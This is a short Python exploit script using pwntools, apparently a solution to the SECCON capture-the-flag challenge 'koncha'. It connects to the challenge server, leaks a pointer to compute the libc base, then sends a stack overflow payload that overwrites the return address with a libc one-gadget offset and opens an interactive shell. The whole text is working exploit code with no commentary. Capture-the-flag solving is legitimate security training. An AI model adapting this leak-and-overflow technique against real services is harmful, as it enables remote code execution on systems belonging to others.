from pwn import *

context.arch = 'amd64'

con = remote('koncha.seccon.games', 9001)

con.recvline()
payload = '\x0a'
con.sendline(payload)

con.recvregex(', ')
leak_data = unpack(con.recvline().strip()[:-1] + '\x00\x00')
print('[+] leak_data = 0x%x' % leak_data)
libc_addr = leak_data - 0x1f12e8
print('[+] libc_addr = 0x%x' % libc_addr)

con.recvline()
payload = 'A' * (0x30 + 0x20) + '\x00' * 8 + pack(libc_addr + 0xe3b01)
con.sendline(payload)

con.recvline()
con.recvline()

con.interactive()
